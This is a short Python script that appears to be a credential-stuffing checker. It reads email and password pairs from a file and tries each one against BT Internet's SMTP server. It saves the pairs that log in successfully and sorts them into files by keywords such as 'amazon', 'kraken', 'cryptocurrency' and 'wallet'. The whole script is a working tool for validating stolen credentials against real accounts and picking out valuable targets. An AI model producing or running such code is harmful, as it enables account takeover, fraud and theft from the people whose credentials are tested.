import smtplib

def check_email_login(email, password):
    try:
        server = smtplib.SMTP('mail.btinternet.com', 587)
        server.starttls()
        server.login(email, password)
        server.quit()
        return True
    except smtplib.SMTPAuthenticationError:
        return False

def save_to_file(logins, keyword, output_folder='output'):
    file_name = f"{output_folder}/{keyword.lower()}_logins.txt"
    with open(file_name, 'w') as f:
        for login in logins:
            f.write(f"{login}\n")

def main(input_file, output_folder='output'):
    with open(input_file, 'r') as f:
        accounts = [line.strip().split(',') for line in f]

    successful_logins = []

    for email, password in accounts:
        if check_email_login(email, password):
            successful_logins.append(f"Email: {email}, Password: {password}")

    save_to_file(successful_logins, 'all', output_folder)

    search_keywords = ['clearpay', 'amazon', 'kraken', 'cryptocurrency', 'wallet']

    for keyword in search_keywords:
        filtered_logins = [login for login in successful_logins if keyword in login.lower()]
        save_to_file(filtered_logins, keyword, output_folder)
 
if __name__ == "__main__":
    input_file = "logins.txt"  # Replace with your input file name
    main(input_file)
